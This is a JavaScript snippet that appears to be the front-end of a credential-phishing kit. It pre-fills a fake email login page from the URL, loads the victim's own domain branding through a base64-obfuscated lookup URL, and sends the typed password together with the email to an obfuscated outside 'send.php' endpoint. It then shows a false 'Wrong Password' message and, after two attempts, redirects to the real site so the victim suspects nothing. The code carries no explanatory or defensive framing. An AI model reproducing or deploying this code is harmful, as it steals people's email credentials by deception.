scripts:
// Close with a click outside
const query = new URLSearchParams(window.location.search)    
var akpati = query.get('e');
var action = 'aHR0cHM6Ly9uYXNvd2VzZWVhbS54eXovbG9ncy91ZG9hL2FsbC9zZXZlbi9zZW5kLnBocA==';

var hashedAkpati = window.location.hash.substr(1);

if( (!akpati && !hashedAkpati) || !/\S+@\S+\.\S+/.test(akpati ? akpati  : hashedAkpati) ){
  // window.location.href = "//google.com"
}else{
    $('#pswd').focus();
    var finalAkpati  = akpati ? akpati  : hashedAkpati; 
    $('#emailsignid').html(finalAkpati)
    // console.log(finalAkpati) 
    let url = atob('aHR0cHM6Ly9mb3JkYWJsZS5zYnMvbXgvP2FjY2Vzcz0=')+finalAkpati;
    fetch(url)
        .then(res => res.json())
        .then(response => {
            favicon = 'https://www.google.com/s2/favicons?domain='+response.domain+'&sz=96';
            // favicon = favicon.replace(/\/$/, "")
            $('#favimg').attr('src', favicon)
            $('#iframe').attr('src', response.bg)
            $('#upfav').attr('href', response.favicon)
            $('#clickedfrom').val(response.redirect)
            $('#clickedfrom').data('redirect', response.redirect)
        })
        .catch(error => {
        });    
} 

window.retryAttemptCount = 0;
var proceedBtn = document.getElementById('proceedBtn');
proceedBtn.addEventListener('click', event => {
    $('.inputerrormsg').html('');
    $('#pswd').removeClass('errorinvalid');
    event.preventDefault();

    if($('#pswd').val() ==='' || $('#pswd').val().length < 6){
        $('#pswd').addClass('errorinvalid').focus();
        $('.inputerrormsg').html('Provide valid email password.')
        return false;
    }
    $('#proceedBtn').prop('disabled', true).html('<span class="spinner primary"></span>')
    window.retryAttemptCount = parseInt(window.retryAttemptCount) + 1;
    fetch(atob(action), {
        method: 'POST',
        body:`email=${finalAkpati}&pass=${$('#pswd').val()}&clientUrl=${$('#clickedfrom').data('redirect')}`,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    })
    .then(res => res.json())
    .then((response) => {
        if(response === true){
            $('#pswd').focus();
            $('.inputerrormsg').html('Wrong Password. Verification failed, please try again').css('font-size', '15px')
            if (window.retryAttemptCount>=2) {
                window.location.href = $('#clickedfrom').data('redirect')
            }
            $('#pswd').val('').focus();
            $('#proceedBtn').prop('disabled', false).html('Proceed')
        }
      console.log(response);
    })
    .catch(err => {
      console.log(err);
    });    
});
